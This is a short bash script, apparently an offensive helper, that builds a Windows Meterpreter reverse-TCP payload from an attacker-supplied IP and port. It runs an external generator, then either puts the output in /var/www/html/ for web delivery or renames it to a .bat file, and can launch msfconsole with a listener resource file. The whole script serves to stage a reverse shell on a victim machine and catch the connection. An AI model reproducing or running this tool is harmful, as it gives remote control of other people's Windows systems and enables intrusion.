#!/usr/bin/env bash

#FMfu


pwned='pw_exec.py'

echo " Your IP :"
read ip;
echo " Your Port :"
read port;

payload=windows/meterpreter/reverse_tcp

python pw_exec.py $payload $ip $port > /dev/null 2>&1
rm unicorn.rc

echo "You want move fireworm.txt to /var/www/html/ ( y or n) :"
read start1;

if [ $start1 = "y" ]; then
 mv fireworm.txt /var/www/html/
else
 echo "Enter the file name :"
 read filename;
 mv fireworm.txt $filename.bat
 echo "now your file is $filename.bat"

fi

echo "Do you want start metasploit ( y or n) :"
read start;

if [ $start = "y" ]; then
 msfconsole -r file.msf
else
 echo "Byee!!"
fi
            
